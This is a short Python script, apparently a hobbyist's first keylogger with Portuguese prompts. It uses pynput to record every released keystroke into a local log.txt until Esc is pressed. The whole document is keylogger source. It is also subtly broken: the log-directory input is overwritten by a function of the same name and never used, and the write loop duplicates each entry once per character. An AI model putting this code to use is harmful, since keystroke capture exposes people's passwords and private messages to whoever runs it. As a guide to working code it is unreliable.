from pynput.keyboard import Listener, Key
print('\t#########\t')
print('\tKEYLOGGER\n\tV0.1 beta')
print('\t#########\t')
print('>aperte esq para interromper<')

log = input('Insira o diretório com o arquivo de log aqui: ')
def log(texto):
    with open('log.txt', 'a') as fl: 
       for t in texto:  
           fl.write(texto)
           fl.write('\n') 

def monitor(key):
    print(key)
    try:
        log(key.char) 
    except AttributeError:
        log('####' + str(key)+'#####')    

    if key == Key.esc:
        return False

with Listener (on_release=monitor) as l:
    l.join()
